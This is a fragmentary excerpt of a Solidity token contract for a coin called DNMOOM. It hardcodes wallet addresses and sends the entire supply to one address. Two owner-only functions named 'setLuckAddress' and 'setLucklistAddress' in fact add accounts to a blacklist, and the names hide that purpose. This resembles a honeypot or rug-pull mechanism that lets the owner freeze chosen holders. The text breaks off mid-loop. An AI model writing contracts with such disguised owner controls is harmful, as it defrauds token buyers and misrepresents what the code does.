...
contract DNMOOM is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DNMOOM";
    string private _symbol = "DNMOOM";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x8d2df98f89122F452e68826CfF2060BBDf940e4f);
    address payable public liquidityContractAddress = payable(0x28d7505E6607617Ea8403b2227a5f1fE2759796c);
    ...
    constructor () {
        ...
        _balances[0x101c7acEA86c8f069e81769361928bF4c977d01c] = _totalSupply;
	...
	function setLuckAddress(address account, bool value) external onlyOwner{
        _isBlacklisted[account] = value;
    }
   
    function setLucklistAddress(address[] memory accounts,bool newValue) external onlyOwner{
        uint len = accounts.length;
        for( uint i = 0; i < len; i++ ){
